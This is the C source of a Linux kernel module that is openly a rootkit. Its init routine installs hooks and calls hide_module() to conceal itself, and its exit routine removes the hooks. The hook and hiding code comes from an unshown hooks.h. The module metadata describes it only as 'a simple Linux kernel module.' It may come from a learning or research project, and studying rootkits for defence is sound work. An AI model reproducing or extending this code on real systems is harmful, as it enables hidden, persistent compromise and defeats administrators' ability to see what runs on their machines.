#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include "hooks.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Amit Katz");
MODULE_DESCRIPTION("A simple Linux kernel module");
MODULE_VERSION("1.0");

static int __init rootkit_init(void)
{
    int err = install_hooks();

    if (err)
        printk(KERN_DEBUG "rootkit: got error %d", err);

    hide_module();

    printk(KERN_INFO "rootkit loaded!\n");

    return 0;
}

static void __exit rootkit_exit(void)
{
    uninstall_hooks();
    printk(KERN_INFO "rootkit unloaded!\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
